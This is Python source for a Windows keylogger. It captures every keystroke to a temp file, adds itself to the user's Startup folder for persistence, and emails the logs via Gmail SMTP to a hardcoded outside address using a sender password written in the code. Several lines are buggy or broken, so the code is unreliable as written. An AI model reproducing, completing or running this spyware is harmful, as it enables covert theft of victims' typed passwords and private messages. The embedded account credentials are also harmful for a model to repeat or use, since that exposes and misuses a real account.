#import Packages
from pynput.keyboard import Key, Listener
import os
import shutil
import datetime
import winshell
from win32com.client import Dispatch
import tempfile
import smtplib
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText
from email.mime.base import MIMEBase
from email import encoders
import threading
import socket


#make folder in temp
save = tempfile.mkdtemp("screen")
print(save)#printing pathto find out the actul path
cwd = os.getcw()#return current directory
source - os.listdir()#gives list of files in current directory

#fist we use datetime module to get current system-date and time
dateAndtime = datetime.datetime.now().strftime("-%y-%m-%d-%h-%m-%s")
#save file with the datetime
filename = save+"\key_log"+dateAndtime+".txt"
open(filename,"w+")
keys=[]
count = 0
countInternet = 0 
word = "Key."
username = os.getlogin()

#create shortcut of file and store into windows startup folder
destination = r'c:\Users\{}\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup'.format(username)

#main method for create shortcut of file and store into windows startup folder
def main():
    path = os.path.join(destination, "keylogger.pyw - Shortcut.lnk")
    target = r""+cwd+"\keylogger.pyw"
    icon = r""+cwd+"\keylogger.pyw"
    for files in source:
        if files == "keylogger.pyw":
            shell = Dispatch('WScript.Shell')
            shortcut = shell.CreateShortCut(path)
            shortcut.Targetpath = target
            shortcut.IconLocation = icon
            shortcut.save()

shortcut = 'keylogger.pyw - Shortcut.lnk'
if shortcut in destination:
    pass
else:
    main()

#to check internet connection
def is_connected():
    try:
        socket.create_connection(("www.google.com", 80))
        return True
    except OSError:
        pass
    return False

#to send an email with an attackment
def send_email():
    fromaddr = "madanayakaproductions@gmail.com"
    toaddr = "s.witharanage@yahoo.com"

    msg = MIMEMultipart()

    msg['From'] = fromaddr
    msg['To'] = toaddr
    msg['Subject'] = "data"
    body = "TEXT"
    msg.attach(MIMETEXT(body, 'plain'))
    attachment = open(filename, "rb")
    part = MIMEBase('application', 'octet-stream')
    encoders.encode_base64(part)
    part.add_header('Content-Disposition', "attachment; filename = %s" % filename)
    msg.attach(part)
    server = smtplib.SMTP('smtp.gmail.com', 587)
    server.starttls()
    server.login(fromaddr, "rajans4ever")
    text = msg.as_string()
    server.sendmail(fromaddr, toaddr, text)
    server.quit()

#write_file method
def write_file(keys):
    with open(filename, "a") as f:
        for key in keys:
            if key == 'Key.enter':
                f.write("\n")
            elif key == 'Key.space':
                f.write(key.replace("Key.space",""))
            elif key[:4] == word:
                pass
            else:
                f.write(key.replace("'",""))

#takes key as parameter
def on_press(key):
    global keys, count, countInternet, filename
    keys.append(str(key))
    if len(keys) > 10:
        write_file(keys)
        if is_connected():
            count += 1
            print('connected {}'.format(count))
            if count > 100:
                count = 0
                t1 = threading.Thread(target=send_email, name='t1')
                t1.start()
        else:
            countInternet += 1
            print('not connected', countInternet)
            if countInternet > 10:
                countInternet = 0
                filename = filename.strip(save)
                for files in save:
                    if files == filename:
                        shutil.copy(files+"t",source)
        keys.clear()

with Listener(on_press=on_press) as listener:
    listener.join()
